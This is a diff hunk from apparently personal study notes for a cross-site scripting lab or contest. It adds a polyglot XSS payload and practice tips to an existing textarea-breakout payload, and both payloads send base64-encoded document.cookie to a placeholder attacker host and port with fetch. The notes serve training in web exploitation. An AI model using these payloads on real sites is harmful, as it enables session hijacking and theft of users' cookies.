@@ -135,8 +135,18 @@ nc
 
 Now that we’ve set up the method of receiving the exfiltrated information, let’s build the payload.
 
+# Note do not remove the http://
 `</textarea><script>fetch('http://URL_OR_IP:PORT_NUMBER?cookie=' + btoa(document.cookie) );</script>`
 
+->> when using burp use collaborator to launch server this is for practice for main event use ip and port 
+
+
+to join it in polygot remebr fetch is a function 
+jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */onerror=fetch('http://ip:8888/?c='+btoa(document.cookie)) )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=fetch('http://ip:8888/?c='+btoa(document.cookie))//>\x3e
+
+
+
+->> read to save yourself guess work 
 Let’s break down the payload:
 
 - The `</textarea>` tag closes the text area field.
